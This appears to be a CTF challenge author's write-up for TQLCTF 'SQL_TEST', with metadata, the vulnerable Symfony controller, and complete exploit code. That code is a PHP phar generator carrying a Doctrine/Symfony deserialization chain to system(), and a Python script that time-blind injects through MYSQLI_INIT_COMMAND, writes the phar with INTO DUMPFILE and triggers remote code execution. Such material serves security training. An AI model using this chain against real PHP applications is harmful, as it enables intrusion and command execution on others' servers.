---
title: TQLCTF/SQL_TEST 出题笔记
contest: TQLCTF
year: null
difficulty: medium
vuln_type:
- sqli
- phar
- deserialize
- rce
tags:
- mysqli_options
- MYSQLI_INIT_COMMAND
- time-based blind
- secure_file_priv
- INTO DUMPFILE
- Symfony
- Doctrine
- RedisProxy
- Dumper
- phar 触发链
attack_chain:
- 审 Symfony 控制器：/test 路由接受 key + value 两个 GET 参数
- mysqli_options($con, $key, $value) 任意调用（key 是数字 option，value 是 string）
- '关键 option: MYSQLI_INIT_COMMAND=3 → 发送 SQL 命令作为连接初始化'
- 强制禁用 LOCAL INFILE，再用 MYSQLI_OPT_LOCAL_INFILE=0
- 但 MYSQLI_INIT_COMMAND 走的是 init_command 通道，不受 LOCAL INFILE 限制
- 用 time-based blind 注 secure_file_priv 路径（select if((select substr(@@global.secure_file_priv, i, 1)='x'), sleep(2), 1)）
- 得到 secure_file_priv 路径（如 /tmp/xxx/）
- 用 INTO DUMPFILE 把 phar 写入该路径（select 0x<hex> into dumpfile '/tmp/xxx/random.phar'）
- 用 phar://random.phar 触发 phar 反序列化
- Symfony Doctrine 反序列化链：RedisProxy.__call → Dumper.__invoke → system()
- 命令执行拿 flag
key_payload: mysqli_options($con, MYSQLI_INIT_COMMAND, 'select 0x<phar_hex> into dumpfile "/tmp/xxx/random.phar"')
one_liner: MYSQLI_INIT_COMMAND 注入 + secure_file_priv 盲注 + INTO DUMPFILE 写 phar + Doctrine 反序列化链 RCE
lesson: PHP mysqli_options 接受任意 option 编号 + 任意 string value；MYSQLI_INIT_COMMAND 通道不受 LOCAL INFILE 禁用影响；Symfony Doctrine 反序列化链通过 RedisProxy.__call 触发
quality: high
full_path: TQLCTF-SQL_TEST出题笔记.full.md
meta_path: TQLCTF-SQL_TEST出题笔记.meta.md
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: TQLCTF/SQL_TEST 出题笔记。MYSQLI_INIT_COMMAND 注入 + secure_file_priv 盲注 + INTO DUMPFILE 写 phar + Doctrine 反序列化链 RCE。关键路径：审 Symfony 控制器：/test 路由接受 key + value 两个 GET 参数 → mysqli_options($con, $key, $value...
category: web
subcategory: sql_injection
subcategories:
- sql_injection
- deserialization
- rce
tools_used:
- PHP
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/27107.html
reasoning_chain:
- 审 Symfony 控制器 /test 路由 → 接受 key + value 两个 GET 参数 → 触发点：mysqli_options($con, $key, $value) 任意调用
- 假设：MYSQLI_INIT_COMMAND=3 是关键 option → 动作：传 MYSQLI_INIT_COMMAND=3 + SQL init 语句
- 观察：MYSQLI_INIT_COMMAND 通道不受 LOCAL INFILE 禁用影响 → 假设：可以 SQL 注入
- secure_file_priv 路径未知 → 假设：time-based blind 注字符 → 动作：select if(substr(@@global.secure_file_priv,i,1)='x', sleep(2), 1)
- 观察：得到 /tmp/xxx/ 路径 → 下一步：INTO DUMPFILE 写 phar 到该路径
- phar 写入后用 phar://random.phar 触发反序列化 → Doctrine 链 RedisProxy.__call → Dumper.__invoke → system('cat /flag')
failed_attempts:
- 试图用 MYSQLI_OPT_LOCAL_INFILE=1 上传本地文件 → 失败：题目禁用 LOCAL INFILE
- 试图直接 INTO DUMPFILE 到 /tmp/ → 失败：secure_file_priv 限定 /tmp/xxx/
key_observations:
- mysqli_options 接受任意 option 编号 + string value，可绕过多数默认防护
- secure_file_priv 路径必须先盲注爆破，不能假设 /tmp/
- Symfony Doctrine 反序列化链 RedisProxy.__call → Dumper.__invoke → system() 是常见 POP 链
prerequisites:
- PHP mysqli_options 选项表（MYSQLI_INIT_COMMAND=3 等）
- Symfony Doctrine 反序列化 POP 链构造
- secure_file_priv 盲注爆破技巧
---
# TQLCTF-SQL_TEST出题笔记

> 原文: https://www.ctfiot.com/27107.html
> ID: 27107


```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
<?php

namespace App\Controller;

use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\HttpFoundation\Request;

class TestController extends AbstractController
{
 /**
 * @Route("/test", name="test")
 */
 public function index(Request $request): Response
 {
 $con = mysqli_init();
 $key = $request->query->get('key');
 $value = $request->query->get('value');

 if (is_numeric($key) && is_string($value)) {
 mysqli_options($con, $key, $value);
 }

 mysqli_options($con, MYSQLI_OPT_LOCAL_INFILE, 0);
 if (!mysqli_real_connect($con, "127.0.0.1", "ctf", "gmlsec123456", "mysql")) {
 $content = '数据库连接失败';
 } else {
 $content = '数据库连接成功';
 }

 mysqli_close($con);

 return new Response(
 $content,
 Response::
HTTP_OK,
 ['content-type' => 'text/html']
 );
 }
}
1
2
3
4
5
6
~  php -a
Interactive shell

php > echo MYSQLI_INIT_COMMAND;
3
php >
1
2
3
4
5
6
public function __call(string $method, array $args)
{
 $this->ready ?: $this->ready = $this->initializer->__invoke($this->redis);

 return $this->redis->{$method}(...$args);
}
1
2
3
4
5
6
7
8
9
10
11
/** @param string|AbstractAsset $assetName */
public function __invoke($assetName): bool
{
 foreach ($this->schemaAssetFilters as $schemaAssetFilter) {
 if ($schemaAssetFilter($assetName) === false) {
 return false;
 }
 }

 return true;
}
1
2
3
4
public function __invoke($var): string
{
 return ($this->handler)($var);
}
1
2
3
4
public function __destruct()
{
 $this->commit();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
<?php

//namespace Doctrine\Bundle\DoctrineBundle\Dbal {
// class SchemaAssetsFilterManager
// {
// private $schemaAssetFilters;
//
// public function __construct()
// {
// $this->schemaAssetFilters = array('system');
// }
// }
//}
namespace Symfony\Component\Console\Helper {
 class Dumper
 {
 private $handler;

 public function __construct()
 {
 $this->handler = 'system';
 }
 }
}

namespace Symfony\Component\Cache\Traits {
 class RedisProxy
 {
 private $redis;
 private $initializer;
 private $ready = false;

 public function __construct()
 {
 $this->redis = 'id';
 $this->initializer = new \Symfony\Component\Console\Helper\Dumper();
// $this->initializer = new \Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager();
 }
 }
}

namespace Doctrine\Common\Cache\Psr6 {
 class CacheAdapter
 {
 private $deferredItems;

 public function __construct()
 {
 $this->deferredItems = array(new \Symfony\Component\Cache\Traits\RedisProxy());
 }
 }
}

namespace {
 $a = new Doctrine\Common\Cache\Psr6\CacheAdapter();
 $phar = new Phar('test.phar');
 $phar->stopBuffering();
 $phar->setStub("GIF89a" . "<?php __HALT_COMPILER(); ?>");
 $phar->addFromString('test.txt', 'test');
 $phar->setMetadata($a);
 $phar->stopBuffering();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
import requests, string, random, os, time

url = "http://127.0.0.1:
7001"

def req(key, value):
 resp = requests.get(url + "/index.php/test", params={'key': key, 'value': value})
 return resp

def get_secure_file_priv():
 char_list = "_/" + string.ascii_letters + string.digits
 template = "select if((select substr(@@global.secure_file_priv,%s,1)='%s'),sleep(2),1)"
 data = ''
 for i in range(1, 100):
 flag = False
 for c in char_list:
 resp = req('3', template % (i, c))
 if resp.elapsed.seconds > 1.5:
 data += c
 flag = True
 print(data)
 break
 if not flag:
 print("end!")
 return data

def exp(secure_file_path):
 filename = "".join(random.sample(string.ascii_letters, 6)) + '.phar'
 file = os.path.join(secure_file_path, filename)

 # write phar file
 hex_data = open("test.phar", "rb").read().hex()
 command = "select 0x{} into dumpfile '{}'".format(hex_data, file)
 req('3', command)

 # check file exists
 command = "select if((ISNULL(load_file('{}'))),sleep(2),1)".format(file)
 if req('3', command).elapsed.seconds > 1.5:
 print("file write fail!")
 exit()

 # clean the cache
 req('3',"FLUSH PRIVILEGES")
 time.sleep(2)

 # trigger unserialize
 resp = req('35', 'phar://' + file)
 print(resp.text)

if __name__ == '__main__':
 secure_file_path = get_secure_file_priv()
 # secure_file_path = '/tmp/1ba652f29a29b74c5c7abb1abf6ba36e/'
 exp(secure_file_path)
```
